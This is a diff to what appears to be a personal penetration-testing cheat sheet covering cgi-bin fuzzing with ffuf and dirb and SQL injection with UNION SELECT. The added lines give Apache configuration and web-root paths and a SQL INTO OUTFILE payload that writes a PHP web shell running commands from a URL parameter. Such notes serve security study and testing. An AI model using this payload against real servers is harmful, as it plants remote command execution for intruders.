@@ -135,6 +135,8 @@
 - Input fields / parameter
 - cgi-bin = content
   - Apache!!!!
+    - /etc/apache2/sites-available/000-default.conf
+    - /var/www/html
 - ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt
 - dirb http://$target -x Extensions (.pl .cgi .sh .ps1)
 - SQL endpoints
@@ -145,6 +147,8 @@
   - UNION SELECT c1,c2,@@version,...cn--
   - parameters?
   - group_concat() = all values from != rows into one string
+  - Where are files written? / DocumentRoot
+    - SELECT "<?php system($_GET['cmd']); ?>" into outfile "PATH/TO/SQL"
 
 
 ## Upload files
